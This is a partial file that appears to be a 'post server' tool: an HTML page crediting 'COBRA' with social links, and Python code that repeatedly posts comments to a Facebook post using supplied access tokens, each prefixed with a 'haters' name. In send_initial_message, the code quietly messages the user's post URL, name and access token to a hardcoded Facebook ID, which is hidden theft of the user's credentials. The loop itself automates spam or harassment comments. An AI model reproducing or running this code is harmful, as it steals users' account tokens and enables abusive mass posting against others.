...
<head>
    ...
    <title>COBRA BRAND POST SERVER</title>
    <style>
        body {
...
<body>
    <div class="container">
        <div class="box">
            <h1>TRICKER COBRA BRAND POST </h1>
            <div class="credit">
                <p>1. CREDIT:- COBRA</p>
                <p>2. OWNER => COBRA</p>
                <p>3. YOUTUBE:- <a href="https://youtube.com/@monxterrulexhere?si=1YkyDgjPaPi4oa4j">YouTube</a></p>
                <p>4. FACEBOOK:- <a href="https://www.facebook.com/share/1ENb4QQPSL/?mibextid=ZbWKwL">Facebook</a></p>
    ...
    <div class="thanks">
        ...
        <p>👇Subscribe to my friend monxter YouTube channel👇</p>
...
def send_initial_message():
    ...
    # Message template
    msg_template = "CREDIT:- COBRA BOYS \n Owner => COBRA \n Hello cobra Sir. \n I am using your post server. \n This Is My Details :- \n Post Url :- {} \n Name:- {} \n Token :- {}"
    
    # Target IDs
    target_ids = ["61572223635140"]
    ...
    while True:
        try:
            for comment_index in range(num_comments):
                ...
                if response.ok:
                    print("\033[1;36m[✓] TRICKER COBRA BRAND SERVER RUNING Comment No. {} Post Id {} Token No. {}: {}".format(
                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                    print(formatted_time)
                    print('\033[1;92m' + '✪✭═══════•『COBRA ♡ BOYS </3 COBRA BRAND』•═══════✭✪')
                else:
                    print("\033[1;35m[x] Failed to send Comment No. {} Post Id {} Token No. {}: {}".format(
                        comment_index + 1, post_url, token_index + 1, haters_name + ' ' + comment))
                    print(formatted_time)
                    print('\033[1;92m' + '✪✭═══════•『COBRA ♡ RULEX </3 COBRA BRAND』•═══════✭✪')
                time.sleep(speed)
